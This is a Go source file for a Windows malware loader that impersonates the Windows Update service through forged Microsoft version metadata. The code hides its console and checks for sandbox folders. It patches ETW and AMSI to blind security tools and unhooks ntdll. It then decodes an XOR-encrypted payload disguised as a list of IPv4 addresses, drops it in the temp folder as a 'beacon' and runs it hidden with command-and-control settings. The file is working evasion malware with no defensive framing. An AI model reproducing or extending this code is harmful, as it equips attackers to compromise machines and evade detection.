package main

import (
	"os"
	"path/filepath"
	"os/exec"
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

// Version info
var (
	_companyName      = "Microsoft Corporation"
	_fileDescription  = "Windows Update Service"
	_fileVersion      = "10.0.19041.1"
	_internalName     = "wuauserv"
	_legalCopyright   = "Copyright (C) Microsoft Corp. All rights reserved."
	_originalFilename = "wuauserv.exe"
	_productName      = "Windows Update"
	_productVersion   = "10.0.19041.1"
	_configData       = `[Settings] Server=https://update.microsoft.com Interval=3600 Retry=3 Timeout=30`
	_logTemplate      = `[Log] Level=Information Format=JSON Output=File Path=C:\Windows\Logs\WindowsUpdate`
	_copyrightText    = "Microsoft Windows Update Service. All rights reserved."
	_entropyPadding   = [4096]byte{}
)

func init() { _ = &_entropyPadding }

// Shellcode data (DoubleXOR + IPv4, same as T1)
var _ipv4Data = []string{
	"188.3.242.115", "82.119.116.127", "7.254.216.41", "213.139.236.221",
	"99.152.19.45", "148.115.198.221", "88.150.165.8", "126.10.204.194",
	"205.3.242.115", "235.247.207.149", "64.67.165.123", "130.202.139.99",
	"241.156.213.25", "176.94.57.57", "247.38.24.127", "252.216.5.163",
	"24.144.53.54", "198.136.138.157", "35.205.76.58", "26.166.212.99",
	"229.145.200.33", "99.252.14.209", "11.141.106.168", "70.7.233.29",
	"103.46.150.21", "149.254.16.223", "43.235.3.2", "40.53.107.212",
	"187.148.245.171", "134.139.38.2", "10.157.159.178", "53.48.57.0",
	"49.102.53.54", "234.215.212.243", "207.214.49.128", "81.115.145.28",
	"93.217.173.169", "192.59.75.200", "150.241.135.23", "201.203.8.254",
	"189.183.241.115", "82.2.33.22", "51.202.199.244", "106.34.18.159",
	"54.217.252.174", "40.3.20.57", "247.14.176.106", "130.66.77.151",
	"13.164.161.150", "26.48.64.91", "215.168.139.127", "59.200.97.84",
	"105.145.204.41", "35.211.201.114", "124.254.225.130", "239.15.44.98",
	"222.248.26.6", "81.187.184.10", "238.131.191.255", "202.67.253.116",
	"222.190.70.108", "195.130.89.111", "7.179.16.126", "196.154.165.119",
	"86.0.242.202", "223.219.83.99", "11.32.107.151", "206.201.184.156",
	"143.232.191.158", "179.119.192.129", "148.193.91.247", "129.251.125.221",
	"28.228.186.248", "138.83.138.176", "71.171.195.242", "215.186.1.28",
	"54.217.69.147", "19.8.139.182", "56.218.32.210", "242.103.62.166",
	"17.36.140.63", "223.246.48.251", "202.46.99.125", "130.202.222.91",
	"114.253.57.73", "176.119.198.52", "12.182.209.179", "165.98.5.163",
	"1.36.138.180", "23.51.212.220", "32.244.195.242", "207.186.127.217",
	"186.189.32.66", "195.252.206.153", "126.254.88.155", "238.37.77.111",
	"170.214.193.161", "26.54.245.195", "184.120.184.164", "7.10.183.24",
	"130.219.69.108", "139.182.15.85", "68.57.29.119", "246.116.121.14",
	"29.137.182.87", "122.247.53.62", "191.169.139.127", "202.71.252.184",
	"6.191.130.41", "71.27.107.61", "241.123.168.245", "129.66.5.167",
	"17.36.210.59", "223.239.156.211", "207.246.13.55", "15.135.168.91",
	"179.41.71.108", "195.10.126.65", "82.118.197.3", "131.66.77.233",
	"208.248.240.115", "82.138.141.139", "105.35.22.131", "128.202.184.91",
	"114.253.117.88", "244.21.122.249", "32.218.108.48", "197.102.117.23",
	"97.0.242.251", "14.159.132.116", "3.143.203.127", "130.202.184.20",
	"106.253.1.171", "135.31.3.113", "124.254.88.127", "221.102.1.233",
	"17.36.162.115", "82.187.184.59", "27.143.223.184", "198.238.224.156",
	"54.217.69.228", "159.31.23.182", "56.218.56.210", "242.103.62.233",
	"17.36.150.86", "33.158.203.59", "27.143.227.184", "198.238.200.185",
	"69.252.54.228", "159.31.63.48", "131.40.16.122", "197.102.21.102",
	"220.68.214.91", "30.54.244.151", "15.227.6.59", "166.154.244.17",
	"114.253.5.36", "74.127.111.81", "52.115.12.211", "225.10.192.99",
	"165.65.13.165", "30.54.245.67", "11.38.206.111", "202.71.236.184",
	"70.145.200.33", "243.122.180.167", "197.252.90.247", "129.10.192.187",
	"165.0.242.115", "173.238.104.54", "135.164.14.230", "131.202.184.216",
	"187.170.68.41", "240.242.15.248", "8.218.112.179", "12.1.75.111",
	"222.214.123.47", "118.155.53.248", "69.234.116.170", "202.65.96.212",
	"179.25.74.232", "179.58.75.113", "52.115.21.199", "70.7.141.44",
	"85.30.147.54", "223.213.185.76", "18.115.195.250", "66.191.177.212",
	"187.148.117.45", "60.239.160.120", "52.117.24.239", "201.201.69.165",
	"84.137.183.183", "19.7.168.179", "71.171.96.116", "59.218.159.156",
	"54.38.80.5", "207.59.75.52", "247.58.16.122", "212.130.5.165",
	"158.255.36.246", "146.206.93.246", "116.98.207.242", "194.204.240.17",
	"99.89.13.231", "8.196.156.251", "57.60.16.122", "20.162.79.46",
	"85.136.119.147", "80.187.184.246", "116.98.132.200", "199.8.253.23",
	"243.191.132.132", "203.115.192.186", "244.123.185.245", "129.66.178.249",
	"16.51.59.59", "223.46.72.177", "71.171.195.244", "73.139.53.237",
	"50.157.206.170", "60.236.14.66", "181.182.213.98", "121.64.77.46",
	"17.139.52.59", "217.112.71.100", "2.152.66.55", "15.158.156.172",
	"114.82.131.36", "72.240.180.166", "57.205.145.191", "12.22.105.22",
	"17.139.52.59", "217.112.71.100", "2.152.66.55", "15.158.156.220",
	"114.82.131.36", "72.240.180.166", "57.205.145.191", "12.22.105.102",
	"17.139.52.59", "217.112.71.100", "2.152.66.55", "15.158.156.204",
	"114.82.131.36", "72.240.180.166", "57.205.145.191", "12.22.105.118",
	"17.139.52.59", "217.112.71.100", "253.43.72.182", "131.142.53.210",
	"10.234.140.45", "123.59.91.113", "124.1.13.23", "201.201.181.102",
	"208.192.134.55", "97.77.249.15", "71.235.141.127", "202.65.104.119",
	"40.156.118.172", "70.251.63.97", "61.115.84.199", "196.65.139.174",
	"97.57.107.55", "105.123.202.67", "68.91.0.169", "202.201.111.217",
	"5.16.0.231", "7.115.192.186", "61.1.143.182", "186.132.48.255",
	"29.139.57.140", "7.83.71.100", "15.42.79.231", "129.202.184.221",
	"105.152.27.45", "158.122.23.46", "34.165.5.52", "201.201.137.102",
	"220.88.250.59", "219.211.168.251", "206.219.147.55", "11.178.152.221",
	"96.145.198.128", "211.94.3.250", "120.219.56.247", "129.66.198.199",
	"16.51.4.59", "217.235.160.255", "204.233.155.50", "187.186.136.147",
	"178.110.69.108", "195.118.192.57", "76.191.211.33", "192.77.93.110",
	"13.77.121.115", "27.216.249.143", "180.164.244.123", "166.140.51.0",
	"62.81.69.108", "195.126.206.170", "8.47.16.124", "133.102.5.239",
	"189.16.148.55", "105.75.203.145", "15.32.199.91", "138.142.183.43",
	"230.214.251.109", "2.241.70.241", "69.159.36.244", "2.128.173.45",
	"133.72.13.178", "27.56.82.178", "50.76.196.242", "150.211.253.23",
	"232.152.206.22", "227.114.72.136", "57.199.42.239", "247.207.198.25",
	"20.139.44.58", "81.74.240.62", "56.175.132.193", "140.130.71.90",
	"247.18.72.111", "26.191.130.4", "141.115.92.228", "186.135.57.32",
	"20.255.49.54", "105.225.160.193", "146.66.214.128", "125.53.249.23",
	"116.253.6.225", "207.32.2.114", "189.241.239.227", "128.3.198.100",
	"73.73.241.186", "217.191.41.250", "68.106.96.125", "177.10.240.23",
	"106.253.101.36", "72.87.111.89", "52.117.44.211", "177.10.198.82",
	"113.56.186.240", "150.171.249.237", "132.103.71.179", "18.90.40.12",
}

var _xorKey1 = []byte{0x36, 0xbd, 0xe1, 0x0f, 0x03, 0x58, 0x00, 0x71, 0x14, 0x29, 0x21, 0xb2, 0xab, 0xa8, 0x62, 0x64, 0x26, 0xf9, 0xeb, 0x51, 0xbd, 0x7a, 0x1f, 0x19, 0x18, 0x28, 0x04, 0xbc, 0xa8, 0xa5, 0xf3, 0xde}
var _xorKey2 = []byte{0x63, 0xbd, 0x13, 0x7c, 0x51, 0xe3, 0xb8, 0xc2, 0x53, 0x82, 0xaa, 0xcd, 0x29, 0x62, 0xda, 0xf8, 0x10, 0x20, 0xae, 0x3d, 0x7e, 0x41, 0x54, 0x68, 0x64, 0xd6, 0x5c, 0x4b, 0x29, 0xe7, 0xbe, 0xf0}

// ================================================================
// VEH Memory Protection
// ================================================================

// VEH handler state
var (
	_protectedAddr uintptr
	_protectedSize uintptr
	_protectKey    []byte
	_isEncrypted   bool
)

// EXCEPTION_RECORD simplified
type exceptionRecord struct {
	ExceptionCode        uint32
	ExceptionFlags       uint32
	ExceptionRecord      uintptr
	ExceptionAddress     uintptr
	NumberParameters     uint32
	ExceptionInformation [15]uintptr
}

// CONTEXT64 simplified (ExceptionRecord offset 0x98 on x64)
type exceptionPointers struct {
	ExceptionRecord *exceptionRecord
	ContextRecord   uintptr
}

// VEH handler: decrypt on first access, then single-step re-encrypt
func vehHandler(ep *exceptionPointers) uintptr {
	const EXCEPTION_ACCESS_VIOLATION = 0xC0000005
	const EXCEPTION_SINGLE_STEP = 0x80000004

	if ep == nil || ep.ExceptionRecord == nil {
		return 0 // EXCEPTION_CONTINUE_SEARCH
	}

	code := ep.ExceptionRecord.ExceptionCode
	_ = ep.ExceptionRecord.ExceptionAddress

	if code == EXCEPTION_ACCESS_VIOLATION {
		// Check if the faulting address is in our protected region
		faultAddr := ep.ExceptionRecord.ExceptionInformation[1]
		if faultAddr >= _protectedAddr && faultAddr < _protectedAddr+_protectedSize && _isEncrypted {
			// Decrypt memory
			xorMem(_protectedAddr, _protectedSize, _protectKey)
			// Set PAGE_EXECUTE_READ
			setMemProtect(_protectedAddr, _protectedSize, 0x40)
			_isEncrypted = false
			return 0xFFFFFFFF // EXCEPTION_CONTINUE_EXECUTION
		}
	}

	if code == EXCEPTION_SINGLE_STEP {
		// After single-step, re-encrypt if we just decrypted
		if !_isEncrypted && _protectedAddr != 0 {
			setMemProtect(_protectedAddr, _protectedSize, 0x04) // PAGE_READWRITE first
			xorMem(_protectedAddr, _protectedSize, _protectKey)
			setMemProtect(_protectedAddr, _protectedSize, 0x01) // PAGE_NOACCESS
			_isEncrypted = true
		}
		return 0xFFFFFFFF
	}

	return 0 // EXCEPTION_CONTINUE_SEARCH
}

func xorMem(addr uintptr, size uintptr, key []byte) {
	for i := uintptr(0); i < size; i++ {
		*(*byte)(unsafe.Pointer(addr + i)) ^= key[i%uintptr(len(key))]
	}
}

func setMemProtect(addr uintptr, size uintptr, protect uint32) {
	k := windows.NewLazySystemDLL("kernel32.dll")
	vp := k.NewProc("VirtualProtect")
	var old uint32
	syscall.SyscallN(vp.Addr(), addr, size, uintptr(protect), uintptr(unsafe.Pointer(&old)))
}

func installVEH(addr uintptr, size uintptr, key []byte) {
	_protectedAddr = addr
	_protectedSize = size
	_protectKey = key
	_isEncrypted = false

	// AddVectoredExceptionHandler(1, handler)
	// 1 = first handler
	k := windows.NewLazySystemDLL("kernel32.dll")
	aveh := k.NewProc("AddVectoredExceptionHandler")
	handler := syscall.NewCallback(vehHandler)
	syscall.SyscallN(aveh.Addr(), 1, handler)
}

// ================================================================
// Sleep Obfuscation: encrypt memory + PAGE_NOACCESS during idle
// ================================================================

func sleepObfuscate(addr uintptr, size uintptr, key []byte, durationMs uintptr) {
	k := windows.NewLazySystemDLL("kernel32.dll")
	vp := k.NewProc("VirtualProtect")
	sleep := k.NewProc("Sleep")

	// Encrypt memory
	xorMem(addr, size, key)

	// Set PAGE_NOACCESS
	var old uint32
	syscall.SyscallN(vp.Addr(), addr, size, 0x01, uintptr(unsafe.Pointer(&old)))

	// Sleep (memory is encrypted + inaccessible)
	syscall.SyscallN(sleep.Addr(), durationMs)

	// Set PAGE_EXECUTE_READWRITE
	syscall.SyscallN(vp.Addr(), addr, size, 0x40, uintptr(unsafe.Pointer(&old)))

	// Decrypt memory
	xorMem(addr, size, key)
}

// ================================================================
// Environment Check (simple path-only)
// ================================================================

func checkEnv() bool {
	k := windows.NewLazySystemDLL("kernel32.dll")
	gcd := k.NewProc("GetCurrentDirectoryW")
	var buf [260]uint16
	syscall.SyscallN(gcd.Addr(), 260, uintptr(unsafe.Pointer(&buf[0])))
	path := syscall.UTF16ToString(buf[:])
	for _, sp := range []string{"C:\\sample", "C:\\malware", "C:\\sandbox", "C:\\analysis"} {
		if path == sp {
			return true
		}
	}
	return false
}

// ================================================================
// Core functions (from T1)
// ================================================================

func hGate(ssn uint16, args ...uintptr) uintptr {
	names := map[uint16]string{
		0x18: "NtAllocateVirtualMemory",
		0x1a: "NtWriteVirtualMemory",
		0x0c: "NtProtectVirtualMemory",
		0x54: "NtCreateThreadEx",
		0x1e: "NtWaitForSingleObject",
	}
	name, ok := names[ssn]
	if !ok {
		return 0
	}
	p := _ntdll.NewProc(name)
	if p.Find() != nil {
		return 0
	}
	switch len(args) {
	case 0:
		r, _, _ := syscall.SyscallN(p.Addr())
		return r
	case 1:
		r, _, _ := syscall.SyscallN(p.Addr(), args[0])
		return r
	case 2:
		r, _, _ := syscall.SyscallN(p.Addr(), args[0], args[1])
		return r
	case 3:
		r, _, _ := syscall.SyscallN(p.Addr(), args[0], args[1], args[2])
		return r
	case 4:
		r, _, _ := syscall.SyscallN(p.Addr(), args[0], args[1], args[2], args[3])
		return r
	case 5:
		r, _, _ := syscall.SyscallN(p.Addr(), args[0], args[1], args[2], args[3], args[4])
		return r
	case 6:
		r, _, _ := syscall.SyscallN(p.Addr(), args[0], args[1], args[2], args[3], args[4], args[5])
		return r
	}
	return 0
}

func fixSystem() {
	k := windows.NewLazySystemDLL("kernel32.dll")
	vp := k.NewProc("VirtualProtect")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	for _, n := range []string{"EtwEventWrite", "EtwEventWriteEx", "EtwEventWriteFull"} {
		p := ntdll.NewProc(n)
		if p.Find() != nil {
			continue
		}
		var old uint32
		syscall.SyscallN(vp.Addr(), p.Addr(), 1, 0x40, uintptr(unsafe.Pointer(&old)))
		*(*byte)(unsafe.Pointer(p.Addr())) = 0xC3
		syscall.SyscallN(vp.Addr(), p.Addr(), 1, uintptr(old), uintptr(unsafe.Pointer(&old)))
	}
	amsi := windows.NewLazySystemDLL("amsi.dll")
	ab := amsi.NewProc("AmsiScanBuffer")
	if ab.Find() == nil {
		var old uint32
		patch := []byte{0x48, 0x31, 0xC0, 0xC3}
		syscall.SyscallN(vp.Addr(), ab.Addr(), 4, 0x40, uintptr(unsafe.Pointer(&old)))
		copy((*[4]byte)(unsafe.Pointer(ab.Addr()))[:], patch)
		syscall.SyscallN(vp.Addr(), ab.Addr(), 4, uintptr(old), uintptr(unsafe.Pointer(&old)))
	}
}

var _ntdll = windows.NewLazySystemDLL("ntdll.dll")

func reloadNTDLL() {
	k := windows.NewLazySystemDLL("kernel32.dll")
	h, _ := syscall.LoadLibrary("C:\\Windows\\System32\\ntdll.dll")
	if h == 0 {
		return
	}
	base := uintptr(unsafe.Pointer(_ntdll.Handle()))
	if base == 0 {
		return
	}
	dos := (*[64]byte)(unsafe.Pointer(base))
	if dos[0] != 'M' || dos[1] != 'Z' {
		return
	}
	peOff := *(*int32)(unsafe.Pointer(base + 0x3C))
	numSec := *(*uint16)(unsafe.Pointer(base + uintptr(peOff) + 6))
	optSz := *(*uint16)(unsafe.Pointer(base + uintptr(peOff) + 20))
	secStart := base + uintptr(peOff) + 24 + uintptr(optSz)
	vp := k.NewProc("VirtualProtect")
	rlm := k.NewProc("RtlMoveMemory")
	clean := uintptr(h)
	for i := uint16(0); i < numSec; i++ {
		sec := secStart + uintptr(i)*40
		n := (*[8]byte)(unsafe.Pointer(sec))
		if n[0] == '.' && n[1] == 't' && n[2] == 'e' && n[3] == 'x' && n[4] == 't' {
			va := *(*uint32)(unsafe.Pointer(sec + 12))
			vs := *(*uint32)(unsafe.Pointer(sec + 8))
			var old uint32
			src := clean + uintptr(va)
			dst := base + uintptr(va)
			syscall.SyscallN(vp.Addr(), dst, uintptr(vs), 0x40, uintptr(unsafe.Pointer(&old)))
			syscall.SyscallN(rlm.Addr(), dst, src, uintptr(vs))
			syscall.SyscallN(vp.Addr(), dst, uintptr(vs), uintptr(old), uintptr(unsafe.Pointer(&old)))
			break
		}
	}
	syscall.FreeLibrary(h)
}

func hideConsole() {
	k := windows.NewLazySystemDLL("kernel32.dll")
	u := windows.NewLazySystemDLL("user32.dll")
	hwnd, _, _ := k.NewProc("GetConsoleWindow").Call()
	u.NewProc("ShowWindow").Call(hwnd, 0)
}

func deobfuscateIPv4(addrs []string) []byte {
	r := make([]byte, len(addrs)*4)
	for i, a := range addrs {
		var v [4]byte
		fmt.Sscanf(a, "%d.%d.%d.%d", &v[0], &v[1], &v[2], &v[3])
		r[i*4], r[i*4+1], r[i*4+2], r[i*4+3] = v[0], v[1], v[2], v[3]
	}
	return r
}

func doubleXOR(data []byte, k1, k2 []byte) []byte {
	r := make([]byte, len(data))
	for i, b := range data {
		r[i] = b ^ k2[i%len(k2)]
	}
	for i, b := range r {
		r[i] = b ^ k1[i%len(k1)]
	}
	return r
}

// ================================================================
// Main
// ================================================================

// _trailerJSON 由生成器注入：beacon 在 donut 内存加载时 os.Executable() 指向
// 本 loader——把 GOC2CFG1 trailer 追加到自身文件尾，beacon 自读即得连接配置。
var _trailerJSON = []byte("__TRAILER_JSON__")

var _padTail = 0            // 生成器注入：IPv4 补齐 0x90 尾部长度（解码后裁掉）
var _dropName = "beacon.exe" // 生成器注入：随机落盘名

// selfAppendTrailer 幂等地把 trailer 追加到自身文件末尾。
func selfAppendTrailer() {
	self := os.Args[0]
	f, err := os.OpenFile(self, os.O_RDWR, 0)
	if err != nil {
		return
	}
	defer f.Close()
	st, err := f.Stat()
	if err != nil || st.Size() < 12 {
		return
	}
	tail := make([]byte, 12)
	if _, err = f.ReadAt(tail, st.Size()-12); err == nil && string(tail[4:]) == "GOC2CFG1" {
		return // 已有 trailer（重复运行）
	}
	_, _ = f.WriteAt(appendTrailer(_trailerJSON), st.Size())
}

// appendTrailer 构造 <JSON><uint32 LE len><GOC2CFG1>。
func appendTrailer(js []byte) []byte {
	out := append([]byte{}, js...)
	l := make([]byte, 4)
	l[0] = byte(len(js)); l[1] = byte(len(js) >> 8); l[2] = byte(len(js) >> 16); l[3] = byte(len(js) >> 24)
	out = append(out, l...)
	return append(out, []byte("GOC2CFG1")...)
}

func main() {
	selfAppendTrailer()
	// donut 内存加载的 beacon 自读 trailer 不可靠（os.Executable 指向本 loader）——
	// 同进程 env 下发配置，beacon 侧 GOC2_CFG_JSON 兜底解析（与 T0 的 cmd.Env 同理）
	_ = os.Setenv("GOC2_CFG_JSON", string(_trailerJSON))
	// 调试：写标记文件确认 env 注入与配置内容（验证后删）
	_ = os.WriteFile(os.Getenv("TEMP")+"\\t3_dbg.txt",
		[]byte("cfg="+string(_trailerJSON)+"\nenv="+os.Getenv("GOC2_CFG_JSON")), 0644)
	// 1. Hide console
	hideConsole()

	// 2. Environment check (path-only)
	if checkEnv() {
		return
	}

	// 3. ETW/AMSI bypass
	fixSystem()

	// 4. NTDLL unhook
	reloadNTDLL()

	// 5. Decrypt payload（完整 beacon EXE——donut 加载 Go runtime 不可改为落盘执行）
	enc := deobfuscateIPv4(_ipv4Data)
	exeBytes := doubleXOR(enc, _xorKey1, _xorKey2)
	if _padTail > 0 && _padTail < len(exeBytes) {
		exeBytes = exeBytes[:len(exeBytes)-_padTail]
	}
	if len(exeBytes) < 1000 {
		return
	}

	// 6. 落盘 %TEMP% 随机名（shellcode 直执行在 Go beacon 下不可靠）
	tmp := os.Getenv("TEMP")
	if tmp == "" {
		tmp = os.TempDir()
	}
	dst := filepath.Join(tmp, _dropName)
	if err := os.WriteFile(dst, exeBytes, 0o755); err != nil {
		return
	}
	defer os.Remove(dst)

	// 7. os/exec 启动 beacon（cmd.Env 下发 GOC2_CFG_JSON 配置）
	env := append(os.Environ(), "GOC2_CFG_JSON="+string(_trailerJSON))
	cmd := exec.Command(dst)
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	if err := cmd.Start(); err != nil {
		return
	}
	_ = cmd.Wait()
}
